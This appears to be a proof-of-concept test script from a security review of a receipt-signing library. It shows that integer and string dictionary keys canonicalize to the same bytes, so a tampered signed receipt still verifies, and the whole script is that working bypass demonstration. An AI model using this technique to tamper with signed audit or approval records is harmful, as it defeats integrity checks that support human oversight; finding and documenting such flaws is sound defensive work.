#!/usr/bin/env python3
"""PoC 11 — S2.1: CANONICALIZATION COLLISION — int keys vs string keys.

json.dumps coerces non-string dict keys: {1: "a"} and {"1": "a"} produce
IDENTICAL canonical bytes. A receipt signed with an int-keyed nested object
still verifies PASS after the attacker swaps the key to a string — two
Python-semantically-different predicates share one signature. (Reachable via
the in-memory API; pure-JSON parsers mask it. Demonstrates canonical() is
not injective over the types it accepts, and silently emits non-strict JSON.)
"""
import sys
sys.path.insert(0, "/home/user/workspace/governance-as-code/tools")
from receipt_lib import (generate_keypair, verify_receipt, canonical,
                         sha256_hex, sign, keyid, PREDICATE_TYPE)

HUMAN = {"type": "human", "id": "s.lutar", "is_service_account": False,
         "auth_method": "hardware_key", "human_principal": "Stephen P. Lutar"}
EV = [{"id": "log", "sha256": sha256_hex(b"x"), "present": True}]

# 1) primitive: the collision itself
a = canonical({1: "smuggled"})
b = canonical({"1": "smuggled"})
print("canonical({1:'smuggled'})  =", a)
print("canonical({'1':'smuggled'}) =", b)
assert a == b, "expected identical canonical bytes"

# 2) end-to-end: sign predicate with int-keyed nested dict, verify the
#    string-keyed twin — different Python object, same signature.
sk, pk = generate_keypair()
predicate_signed = {
    "action_id": "a-001", "actor": HUMAN,
    "policy_decision": {"result": "ALLOW", "policy_hash": sha256_hex(b"p")},
    "execution": {"side_effect_class": "READ_ONLY", "status": "EXECUTED"},
    "evidence": {"items": EV, "completeness": "COMPLETE", "redaction_commitments": []},
    "timestamps": {"created": "t", "executed": "t", "ntp_synced": True},
    "prev_chain_hash": "GENESIS",
    "labels": {1: "smuggled"},          # int key (single-key dict: sort_keys safe)
}
stmt = {"predicateType": PREDICATE_TYPE,
        "subject": {"name": "prod:svc",
                    "digest": {"sha256": sha256_hex(canonical(predicate_signed))}},
        "predicate": predicate_signed}
stmt["signatures"] = [{"keyid": keyid(sk.public_key()),
                       "sig": sign(sk, PREDICATE_TYPE, canonical(stmt))}]

# attacker mutates: int key -> string key (object identity/type changed)
import copy
tampered = copy.deepcopy(stmt)
tampered["predicate"]["labels"] = {"1": "smuggled"}
assert tampered["predicate"]["labels"] != stmt["predicate"]["labels"] or \
       type(list(tampered["predicate"]["labels"])[0]) is not type(list(stmt["predicate"]["labels"])[0])

v = verify_receipt(tampered, pk)
print("verdict on key-type-mutated receipt:", v.verdict, "| reasons:", v.reasons)

# Unexpected PASS: a predicate that is NOT the signed Python object verifies.
if v.verdict == "PASS":
    print("EXPLOIT-WORKS")
else:
    print("HELD")
